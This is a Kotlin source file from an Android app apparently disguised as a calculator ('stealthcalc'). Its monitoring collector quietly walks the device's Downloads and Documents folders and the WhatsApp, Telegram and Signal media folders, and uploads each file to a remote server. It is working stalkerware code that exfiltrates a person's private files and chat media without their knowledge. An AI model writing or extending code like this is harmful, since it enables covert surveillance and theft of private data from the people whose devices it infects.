package com.stealthcalc.monitoring.collector

import android.content.Context
import android.os.Environment
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.FileUploader
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.net.URLConnection
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FileSyncCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
    private val uploader: FileUploader,
) {
    private val syncedFiles = mutableSetOf<String>()
    private val maxFileSize = 50L * 1024 * 1024

    suspend fun collect() = withContext(Dispatchers.IO) {
        if (!repository.isMetricEnabled("file_sync")) return@withContext

        val dirs = mutableListOf<Pair<File, String>>()

        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)?.let {
            dirs.add(it to "downloads")
        }
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)?.let {
            dirs.add(it to "documents")
        }

        if (repository.isMetricEnabled("chat_media")) {
            val whatsappMedia = File(Environment.getExternalStorageDirectory(), "WhatsApp/Media")
            if (whatsappMedia.exists()) dirs.add(whatsappMedia to "whatsapp")

            val telegramMedia = File(Environment.getExternalStorageDirectory(), "Telegram")
            if (telegramMedia.exists()) dirs.add(telegramMedia to "telegram")

            val signalMedia = File(
                context.getExternalFilesDir(null)?.parentFile?.parentFile,
                "org.thoughtcrime.securesms/files"
            )
            if (signalMedia != null && signalMedia.exists()) dirs.add(signalMedia to "signal")
        }

        dirs.forEach { (dir, category) ->
            if (dir.exists() && dir.isDirectory) {
                syncDirectory(dir, category, depth = 0)
            }
        }
    }

    private suspend fun syncDirectory(dir: File, category: String, depth: Int) {
        if (depth > 3) return

        dir.listFiles()?.forEach { file ->
            if (file.isDirectory) {
                syncDirectory(file, category, depth + 1)
                return@forEach
            }

            val key = "${file.absolutePath}:${file.lastModified()}"
            if (key in syncedFiles) return@forEach
            if (file.length() > maxFileSize) return@forEach
            if (file.name.startsWith(".")) return@forEach

            val mime = URLConnection.guessContentTypeFromName(file.name) ?: "application/octet-stream"
            val success = uploader.uploadFile(
                file = file,
                mimeType = mime,
                category = category,
                capturedAt = file.lastModified(),
            )
            if (success) {
                syncedFiles.add(key)
                AppLogger.log(context, "[agent]", "Synced file: ${file.name} ($category)")
            }
        }
    }
}
